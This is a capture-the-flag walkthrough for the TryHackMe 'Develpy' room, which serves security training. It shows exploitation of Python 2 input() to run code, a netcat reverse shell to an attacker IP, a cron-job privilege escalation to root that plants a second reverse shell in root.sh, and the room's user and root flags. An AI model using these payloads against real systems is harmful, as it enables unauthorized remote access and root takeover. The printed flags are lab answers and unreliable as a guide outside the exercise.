# TryHackMe: Develpy — Walkthrough
Room Information
- Target OS: Linux (Ubuntu)
- Difficulty: Medium
- Topics: Port Scanning, Python ```input()``` Arbitrary Code Execution, Cron Job Exploitation, Privilege Escalation

## 1. Reconnaissance & Nmap Enumeration
An initial Nmap scan was conducted against the target IP to discover open ports and running services:
```bash
nmap -sV -sC -p- 10.49.162.135
```
Open Ports Discovered
- Port 22/tcp: OpenSSH 7.2p2 Ubuntu 4ubuntu2.8
- Port 10000/tcp: ```snet-sensor-mgmt``` (Custom Python script service)

## 2. Service Analysis & Code Injection
Connecting to port ```10000``` via Netcat or browser presented an interactive prompt running a custom script (```exploit.py```):
```plaintext
Private 0days
Please enther number of exploits to send??:
```
Submitting non-integer input triggered a Python Traceback displaying the underlying code structure:
- ```num_exploits = int(input(' Please enther number of exploits to send??: '))```

### Vulnerability MechanicsIn
Python 2.x, the ```input()``` function automatically evaluates user input as standard Python code (```equivalent to eval(raw_input())```). This allows unauthenticated users to execute arbitrary Python code within the context of the service wrapper.

Testing execution:
- Input: ```eval('1+1')``` $\rightarrow$ Executed successfully.

## 3. Initial Access & User Flag
Reverse Shell Exploitation
A Python reverse shell payload using ```__import__('os').system()``` was passed directly into the input prompt:
```python
eval('__import__("os").system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.130.211 1234 >/tmp/f")')
```
Catching the Shell
A Netcat listener on the attacker machine caught the incoming shell connection as user ```king```:
```bash
nc -lnvp 1234
```
After spawning an interactive TTY session:
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
```
The user flag was located in the home directory (```/home/king/user.txt```):
```bash
cat /home/king/user.txt
```
- User Flag: ```cf85ff769cfaaa721758949bf870b019```

## 4. Privilege Escalation to Root
Crontab Enumeration
Inspecting the system-wide crontab (```/etc/crontab```) revealed a recurring scheduled task:
```bash
cat /etc/crontab
```
```plaintext
* * * * * root cd /home/king/ && bash root.sh
```
A root cron job executed ```/home/king/root.sh``` every minute.

### Exploiting ```root.sh```
Since ```/home/king/root.sh``` resided in user ```king's``` home directory and had write permissions, the script was replaced with a malicious reverse shell command:
```bash
rm /home/king/root.sh
nano /home/king/root.sh
```
Payload Written to ```root.sh```:
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.130.211 9999 >/tmp/f
```
### Root Shell & Flag Retrieval
A Netcat listener was opened on port ```9999```:
```bash
nc -lnvp 9999
```
When the cron job executed a minute later, a root shell was established:
```bash
whoami
# root

cat /root/root.txt
# 9c37646777a53910a347f387dce025ec
```
- Root Flag: ```9c37646777a53910a347f387dce025ec```
